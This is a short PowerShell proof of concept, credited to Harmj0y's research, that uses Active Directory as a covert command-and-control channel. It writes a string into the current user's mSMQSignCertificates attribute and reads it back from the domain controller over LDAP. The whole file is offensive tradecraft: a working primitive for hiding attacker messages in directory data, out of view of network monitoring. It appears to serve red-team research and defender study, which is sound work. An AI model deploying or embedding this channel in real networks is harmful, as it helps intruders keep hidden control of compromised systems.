#Based on the research done by Harmj0y at http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/
	$global:username = [Environment]::UserName
#Write String to AD
	$CB = ([adsisearcher]"(samaccountname=$global:username)").FindOne().GetDirectoryEntry()
	$CB.Put('mSMQSignCertificates','one2three4')
	$CB.SetInfo()
#ReadString from AD
	$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname
	$Domain = $ENV:USERDNSDOMAIN
	$DC = ([ADSI]'LDAP://RootDSE')
	$DN = "DC=$($Domain.Replace('.', ',DC='))"
	$SearchString = "LDAP://$DomainController/$DN"
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$Searcher.Filter = "(samaccountname=$global:username)"
	$User = $Searcher.FindOne()
	[System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])

